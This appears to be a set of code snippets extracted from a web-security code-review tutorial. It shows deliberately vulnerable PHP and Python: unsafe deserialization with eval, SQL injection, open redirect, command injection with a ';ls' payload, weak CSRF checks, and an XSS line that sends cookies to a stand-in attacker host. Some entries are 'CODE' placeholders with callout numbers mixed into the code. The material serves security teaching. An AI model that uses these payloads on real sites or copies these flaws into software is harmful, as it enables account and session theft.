["```\n<?php [...] class UserFunction { private $hook;    function __construct(){ [...] }    function __wakeup(){ 1 if (isset($this->hook)) eval($this->hook); } } [...]2 $user_data = unserialize($_COOKIE['data']); [...]\n?>\n```", "```\n<?php class UserFunction { private $hook = \"phpinfo();\"; } print urlencode(serialize(new UserFunction));\n?>\n```", "```CODE```", "```CODE```", "```\nimport requests1 GITHUB_ACCESS_TOKEN = \"0518fb3b4f52a1494576eee7ed7c75ae8948ce70\"\nheaders = {\"Authorization\": \"token {}\".format(GITHUB_ACCESS_TOKEN), \\\n\"Accept\": \"application/vnd.github.v3+json\"}\napi_host = \"https://api.github.com\"2 usernames = [\"vickie\"] # List users to analyze\ndef request_page(path): resp = requests.Response() try: resp = requests.get(url=path, headers=headers, timeout=15, verify=False) except: pass return resp.json()3 def find_repos(): # Find repositories owned by the users. for username in usernames: path = \"{}/users/{}/repos\".format(api_host, username) resp = request_page(path) for repo in resp: print(repo[\"name\"])\nif __name__ == \"__main__\": find_repos()\n```", "```\n# todo: Implement CSRF protection on the change_password endpoint.\n```", "```\nhttp://dev.example.com/admin?debug=1&password=password # Access debug panel\n```", "```\ndef login(): query = \"SELECT * FROM users WHERE username = '\" + \\ 1 request.username + \"' AND password = '\" + \\ request.password + \"';\" authed_user = database_call(query)2 login_as(authed_user)\n```", "```\nSELECT password FROM users WHERE username = 'admin' --' AND password = '';\n```", "```\n<?php [...] if ($logged_in){ 1 $redirect_url = $_GET['next']; 2 header(\"Location: \". $redirect_url); exit; } [...]\n?>\n```", "```\n<?php\n[...]\nif ($logged_in){ $redirect_url = $_GET['next']; 1 if preg_match(\"/example.com/\", $redirect_url){ header(\"Location: \". $redirect_url); exit; }\n}\n[...]\n?>\n```", "```\nparse_url(\"https://www.example.com/index.html\", PHP_URL_PATH)\n```", "```\n<?php [...]1 $url_path = parse_url($_GET['download_file'], PHP_URL_PATH);2 $command = 'wget -o stdout https://example.com' . $url_path;3 system($command, $output);4 echo \"<h1> You requested the page:\" . $url_path . \"</h1>\"; echo $output;  [...]\n?>\n```", "```\nhttps://example.com/download?download_file=https://example.com/abc\n```", "```\nhttps://example.com/download?download_file=https://example.com/download;ls\n```", "```\n<?php $exploit_string = \"<script>document.location='http://attacker_server_ip/cookie_stealer .php?c='+document.cookie;</script>\"; echo \"https://example.com/\" . $exploit_string;\n?>\n```", "```\nimport requests\nimport urllib.parse as urlparse\nfrom urllib.parse import parse_qs\napi_path = \"https://api.example.com/new_password\"\nuser_data = {\"new_password\":\"\", \"csrf_token\":\"\"}\ndef get_data_from_input(current_url): # get the URL parameters # todo: we might want to stop putting user passwords 1 # and tokens in the URL! This is really not secure.  # todo: we need to ask for the user's current password  # before they can change it! url_object = urlparse.urlparse(current_url) query_string = parse_qs(url_object.query) try: user_data[\"new_password\"] = query_string[\"new_password\"][0] user_data[\"csrf_token\"] = query_string[\"csrf_token\"][0] except: pass\ndef new_password_request(path, user_data): if user_data[\"csrf_token\"]: 2 validate_token(user_data[\"csrf_token\"]) resp = requests.Response() try: resp = requests.post(url=path, headers=headers, timeout=15, verify=False, data=user_data) print(\"Your new password is set!\") except: pass\ndef validate_token(csrf_token):  if (csrf_token == session.csrf_token): pass else: raise Exception(\"CSRF token incorrect. Request rejected.\")\ndef validate_referer(): 3 # todo: implement actual referer check! Now the function is a placeholder. 4 if self.request.referer: return True else: throw_error(\"Referer incorrect. Request rejected.\")\nif __name__ == \"__main__\": validate_referer() get_data_from_input(self.request.url) new_password_request(api_path, user_data)\n```", "```\nhttps://example.com/change_password?new_password=abc&csrf_token=\nhttps://example.com/change_password?new_password=abc\n```"]